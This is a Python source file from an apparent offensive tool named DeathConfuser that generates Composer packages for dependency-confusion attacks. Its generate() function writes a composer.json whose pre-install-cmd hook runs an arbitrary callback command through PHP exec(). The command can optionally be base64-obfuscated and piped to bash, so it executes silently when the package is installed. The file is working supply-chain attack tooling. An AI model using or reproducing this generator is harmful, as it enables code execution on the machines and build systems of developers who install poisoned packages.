"""Composer payload generator."""
from __future__ import annotations

import base64
from typing import Optional

from ...payloads.builder import PayloadBuilder

builder = PayloadBuilder()


def _encode(cmd: str, method: Optional[str]) -> str:
    if method == "b64":
        return base64.b64encode(cmd.encode()).decode()
    return cmd


def generate(vendor: str, package: str, callback: str, encode: Optional[str] = None) -> str:
    """Return composer.json with a pre-install-cmd callback."""

    cmd = f"php -r \"exec('{callback}');\""
    payload_cmd = _encode(cmd, encode)
    script = payload_cmd if encode is None else f"base64 -d <<< {payload_cmd} | bash"
    return builder.render(
        "composer.json.j2",
        vendor=vendor,
        package_name=package,
        description="DeathConfuser payload",
        version="0.0.1",
        payload_code=script,
    )
